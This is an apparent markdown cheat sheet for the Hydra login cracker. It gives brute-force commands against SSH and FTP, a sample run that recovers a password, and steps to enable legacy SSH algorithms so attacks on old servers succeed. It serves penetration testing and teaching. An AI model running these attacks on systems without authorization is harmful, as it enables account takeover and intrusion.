# Logon Cracker [hydra]
<img src="https://www.kali.org/tools/hydra/images/hydra-logo.svg" style="width:120px;"/>

Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.

---

### 1- Attack ssh root password
`hydra -l root -P wordlist.txt 192.160.70.22 ssh`
- `-l` specify the user 
- `-P` specify the wordlist
- `192.160.70.22` target host
- `ssh` protocol to attack
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-16 16:36:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://192.160.70.22:22/
[22][ssh] host: 192.160.70.22   login: nagy   password: nagy
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-16 16:36:08
```

---
### 2- Specify an attack on a custom port
`hydra -l root -P wordlist.txt -s 8020 192.160.70.22 ftp`
- `-s` if the service is on a different default port

---
### 3- Specify users list
In certain cases we dont know the user name, we can specify a list with possible usernames.

`hydra -L users.txt -P wordlist.txt -s 8020 192.160.70.22 ftp`
- `-L` load several logins from FILE



---
### 4- Fix wide range compatability problem
In many cases hydra produce this error because the target machine uses legacy key exchange algorithms.

`
[ERROR] could not connect to ssh://192.160.70.22:22 - kex error : no match for method server host key algo: server [ssh-rsa,ssh-dss], client [ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com,rsa-sha2-512,rsa-sha2-256]
`

We have to enable the ssh wide compatability mode in kali:

- in terminal run `sudo kali-tweaks`
- select `Hardening`
- go down with keys and tick `SSH Client` by pressing the space bar, then select apply.
- in terminal type `sudo systemctl restart sshd` 
- run the Hydra attack, should work now
